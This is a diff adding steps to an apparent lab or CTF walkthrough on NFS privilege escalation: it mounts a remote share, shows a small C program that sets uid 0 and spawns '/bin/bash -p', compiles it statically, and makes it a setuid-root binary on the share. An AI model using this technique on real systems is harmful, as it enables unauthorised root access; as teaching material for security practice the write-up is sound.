@@ -35,3 +35,46 @@ example :
 ```bash
 sudo mount -o rw 10.114.144.62:/tmp /tmp/nfs_mount
 ```
+
+![img](screenshots/NFS/make_mount.png)
+
+---
+
+then create file.c and write exploit code 
+
+![img](screenshots/NFS/nano_nfs.png)
+
+```bash
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+int main()
+{
+        setuid(0);
+        setgid(0);
+        system("/bin/bash -p");
+        return 0;
+}
+```
+
+![img](screenshots/NFS/exploit_code.png)
+
+compile it by 
+
+```bash
+gcc nfs.c -o nfs -static
+```
+![img](screenshots/NFS/compile_it.png)
+
+change owner to run as root ,and permission
+
+```bash
+sudo chown root:root /tmp/nfs_mount/nfs
+sudo chmod +s /tmp/nfs_mount/nfs
+```
+
+ ![img](screenshots/NFS/change_own_perm.png)
+
+---
+
